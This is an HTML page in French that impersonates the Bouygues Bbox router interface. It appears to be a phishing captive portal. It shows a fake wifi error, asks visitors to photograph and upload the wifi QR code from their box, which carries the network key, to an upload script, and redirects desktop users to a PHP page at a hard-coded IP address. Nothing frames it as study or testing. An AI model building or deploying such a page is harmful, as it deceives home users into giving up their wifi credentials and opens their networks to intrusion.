<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
<title>Bienvenue sur votre interface Bouygues</title>
<link href="/bboxcss/centrage.css" rel="stylesheet" type="text/css" />
<script type="text/javascript" src="js/jquery-1.11.3-jquery.min.js"></script>
<script type="text/javascript" src="script.js"></script>
<IMG class="displayed" src="bbox2.png">
</head>
<br>
<br>
<script>
// Check if the user is accessing the page on a mobile device
var isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);

if (isMobile) {
  // User is accessing the page on a mobile device
  console.log("Mobile device detected");
  // window.open("http://175.0.0.1/bboxmobile.php", "_system");
} else {
  // User is accessing the page on a desktop device
  console.log("Desktop device detected");
  window.location.href = "http://175.0.0.1/bboxdesktop.php";
}
</script>
<br>
<br>
<br>
<body>
<p><font color="teal">Code erreur 109: une erreur est survenue sur le réseau wifi.</p>
<br>
<p><font color="teal">Veuillez vous connecter en prenant en photo le QR code qui s'affiche sur votre box.<b>Cette méthode permet de connecter l'ensemble de vos équipements sans avoir à taper la clé de sécurité wifi pour chacun d'eux.</b>Le QR code wifi s'affiche via le menu wifi de votre Bbox.
<br>
<form action="uploadfiles.php" method="post" enctype="multipart/form-data">
	<p>
	<label for="my_upload">Select the file to upload:</label>
	<input id="my_upload" name="my_upload" type="file">
	</p>
	<input type="submit" value="Upload Now">
	</form>
</br>
</br>
</body>
</html>
